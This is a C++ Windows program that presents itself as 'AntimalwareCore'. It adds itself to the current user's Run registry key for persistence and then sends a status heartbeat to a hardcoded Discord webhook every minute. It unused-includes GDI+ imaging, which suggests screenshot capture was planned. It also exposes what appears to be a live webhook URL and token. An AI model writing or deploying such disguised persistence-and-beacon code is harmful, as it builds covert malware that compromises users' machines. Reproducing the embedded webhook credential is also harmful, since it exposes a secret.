#include <windows.h>
#include <gdiplus.h>
#include <wininet.h>
#include <shlobj.h>
#include <string>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")

using namespace Gdiplus;

// --- CONFIGURATION ---
// Replace this with your actual Discord Webhook URL
std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1497212800219484180/ffoUppkjBoo9PJMX8CgLtFigvLSSMFk8R0MY4hLTd-7aIV1Bzm1xggX3mpRD2c20Eklo";
// ---------------------

std::string g_MessageID = "";

// Helper to format time as 7:17 (12-hour format)
std::string GetTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    int hour = st.wHour;
    std::string ampm = (hour >= 12) ? "PM" : "AM";
    if (hour > 12) hour -= 12;
    if (hour == 0) hour = 12;

    std::stringstream ss;
    ss << hour << ":" << std::setfill('0') << std::setw(2) << st.wMinute << " " << ampm;
    return ss.str();
}

// Function to send or edit the heartbeat message
void SendHeartbeat() {
    if (WEBHOOK_URL.find("http") == std::string::npos) return;

    HINTERNET hSession = InternetOpenA("AntimalwareCore", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;

    std::string method = "POST";
    std::string url = WEBHOOK_URL + "?wait=true";
    
    if (!g_MessageID.empty()) {
        method = "PATCH";
        url = WEBHOOK_URL + "/messages/" + g_MessageID;
    }

    // Prepare JSON payload
    std::string json = "{\"content\": \"**System Status:** Online \\n**Last Ping:** " + GetTimestamp() + "\"}";

    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (hConnect) {
        // Extract technical path from URL
        size_t pos = url.find("discord.com");
        std::string path = url.substr(pos + 11);

        HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
        if (hRequest) {
            std::string headers = "Content-Type: application/json\r\n";
            if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)json.c_str(), json.length())) {
                if (g_MessageID.empty()) {
                    // On first run, grab the ID from response
                    char buffer[4096];
                    DWORD bytesRead;
                    if (InternetReadFile(hRequest, buffer, sizeof(buffer)-1, &bytesRead)) {
                        buffer[bytesRead] = '\0';
                        std::string resp(buffer);
                        size_t idPos = resp.find("\"id\": \"");
                        if (idPos != std::string::npos) {
                            g_MessageID = resp.substr(idPos + 7, 19); // Typical Snowflake length
                        }
                    }
                }
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hSession);
}

void EnsurePersistence() {
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "AntimalwareCore", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
            RegCloseKey(hKey);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    EnsurePersistence();

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    while (true) {
        SendHeartbeat();
        Sleep(60000); // Wait 1 minute
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}
